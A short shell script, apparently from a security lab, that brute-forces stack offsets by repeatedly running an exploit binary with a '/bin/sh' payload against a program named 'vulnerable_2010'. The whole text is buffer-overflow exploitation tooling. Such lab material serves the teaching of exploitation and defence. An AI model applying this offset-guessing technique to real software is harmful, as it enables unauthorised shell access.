#! /bin/sh
BUFFER=600
OFFSET=$BUFFER
OFFSET_MAX=200000
while [ $OFFSET -lt $OFFSET_MAX ] ; do
    echo "Offset = $OFFSET"
    ./exploit_2010 $BUFFER $OFFSET 0 novar force /bin/sh ./vulnerable_2010
    OFFSET=$(($OFFSET + 4))
done

